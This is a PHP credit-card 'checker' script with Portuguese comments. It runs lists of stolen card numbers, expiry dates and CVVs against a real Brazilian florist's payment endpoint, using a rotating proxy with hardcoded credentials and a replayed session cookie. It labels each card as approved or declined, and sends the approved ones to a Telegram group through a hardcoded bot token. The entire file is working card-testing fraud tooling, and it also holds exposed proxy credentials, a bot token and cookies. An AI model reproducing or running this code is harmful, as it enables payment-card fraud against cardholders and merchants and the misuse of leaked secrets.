<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Função para extrair string entre dois delimitadores
function GetStr($string, $start, $end) {
    $start_pos = strpos($string, $start);
    if ($start_pos === false) return false;
    $start_pos += strlen($start);
    $end_pos = strpos($string, $end, $start_pos);
    if ($end_pos === false) return false;
    return substr($string, $start_pos, $end_pos - $start_pos);
}

// Configurações do proxy
$username = "mbubg8qv3j6d0w4";
$password = "a11m6m884wn1xsi";
$PROXYSCRAPE_PORT = 6060;
$PROXYSCRAPE_HOSTNAME = 'rp.scrapegw.com';

// Obtém o IP inicial (opcional, dependendo se você precisa exibir o IP do proxy)
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.meuip.com.br/');
curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.meuip.com.br',
    'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Android WebView";v="126"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
));
$u = curl_exec($ch);
$ip = GetStr($u, 'color: #FF8000;">Meu ip é ','<');
curl_close($ch);

// URL do endpoint
$url = "https://www.coroas24horas.com.br/redecard-processa.php";

// Cabeçalhos da requisição
$headers = [
    "Host: www.coroas24horas.com.br",
    "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOYLMQ49KUv5xEBBn",
    "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Accept: */*",
    "Origin: https://www.coroas24horas.com.br",
    "Referer: https://www.coroas24horas.com.br/pedido-finalizado/298709-4.html",
    "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6",
    "Cookie: PHPSESSID=05pvs7c7ga2067mhm7f205gki4; clix.session=85943321355656772; _fbp=fb.2.1753745032732.105638447887708451; _ga=GA1.1.1877592298.1753745033; cf_clearance=QfvbI16gUTQat_suPL6E._RvEWUwy.r1iJUuRgxp2PU-1752904560-1.2.1.1-hLJU9vOd4mJmJr_Y0F7wZ5kFLuOi5x5t_6MKrZZIaZFkhiX08JPydcUYrrDaA4qSWcOZ2fc_hp_sDT72hU4EzY2.0gwLfTs73O5Z_PHBOt3l8rmMKMmO0L6Wna50oNb1O0jDjO.sFWRF2KSoNPnrtx5X5blXgtRBARf3pXvGb4wOgeikSEV57qAjzllphtO2q_LvWBw9mxodcIvHbysrcKTUeKFJJckA6geQyzMZDE8"
];

// Função para enviar mensagem para o Telegram
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML' // Para permitir formatação HTML
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

// Obtém a lista de cartões da query string
$lista = $_GET['lista'] ?? '';
$cartoes = explode(",", $lista); // Supondo que os cartões sejam passados como uma string separada por vírgulas

foreach ($cartoes as $card) {
    try {
        list($cc, $mes, $ano, $cvv) = explode("|", $card);

        $payload = "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"crdt-numero\"\r\n\r\n" .
                   "$cc\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"crdt-nome\"\r\n\r\n" .
                   "Pedro Henrique\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"crdt-validade-month\"\r\n\r\n" .
                   "$mes\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"crdt-validade-year\"\r\n\r\n" .
                   "$ano\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"crdt-seguranca\"\r\n\r\n" .
                   "$cvv\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"crdt-parcela\"\r\n\r\n" .
                   "1\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn\r\n" .
                   "Content-Disposition: form-data; name=\"code\"\r\n\r\n" .
                   "296809\r\n" .
                   "------WebKitFormBoundaryOYLMQ49KUv5xEBBn--";

        // Inicializa cURL com configurações de proxy
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Desativa verificação SSL
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        // Adiciona configurações do proxy
        curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
        curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
        curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);

        // Executa a requisição
        $start_time = microtime(true); // Inicia o cronômetro
        $response = curl_exec($ch);
        $resp_text = trim($response);
        $end_time = microtime(true); // Para o cronômetro

        // Calcula o tempo de resposta
        $tempo_resposta = round($end_time - $start_time, 2);

        // Verifica a resposta
        $returnCode = ''; // Variável para armazenar o returnCode
        $message = ''; // Variável para armazenar a mensagem

        // Tenta decodificar a resposta JSON
        $json_response = json_decode($resp_text, true);
        if (isset($json_response['returnCode'])) {
            $returnCode = $json_response['returnCode'];
            $message = $json_response['message'] ?? 'Sem mensagem';
        }

        // Formata a saída
        if ($returnCode === "119") {
            // Envio para o Telegram
            $botToken = "7678677817:AAFxLzmYAN2zPq_kaX6l8SsoDsGcEWKMOSQ"; // Substitua pelo seu token do bot
            $chatId = "-1002598123960"; // ID do grupo
            $telegramMessage = "✅ LIVE CHECKER GG VIP\n" .
                               "🛠 GATE: E-REDE\n" .
                               "💳 BIN: " . substr($cc, 0, 6) . "******\n" . // Mostra apenas os 6 primeiros dígitos da BIN
                               "🔄 RETORNO: $message\n" .
                               "🥇 CREDITOS: @TerrifierSuporte\n" .
                               "⏳ Tempo: ($tempo_resposta SEG)";
            sendTelegramMessage($chatId, $telegramMessage, $botToken);

            echo "<span class='badge badge-success'>Aprovada</span> » $cc|$mes|$ano|$cvv » <b> Retorno: <span class='text-success'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) » ➔ PROXY: $ip <br></b>";
        } elseif (strpos($resp_text, 'is3DSecureRequired') !== false) {
            echo "<span class='badge badge-success'>Aprovada</span> » $cc|$mes|$ano|$cvv » <b> Retorno: <span class='text-success'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) » ➔ PROXY: $ip <br></b>";
        } else {
            echo "<span class='badge badge-danger'>Reprovada</span> » $cc|$mes|$ano|$cvv » <b> Retorno: <span class='text-danger'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) » ➔ PROXY: $ip <br></b>";
        }

        curl_close($ch); // Fecha a conexão cURL
        sleep(5); // Espera 5 segundos entre as requisições

    } catch (Exception $e) {
        echo "<span class='badge badge-danger'>Erro</span> » $cc|$mes|$ano|$cvv » <b> Mensagem: <span class='text-danger'>" . $e->getMessage() . "</span></b> » <b>Tempo: ($tempo_resposta SEG) » ➔ PROXY: $ip <br></b>";
    }
}
?>
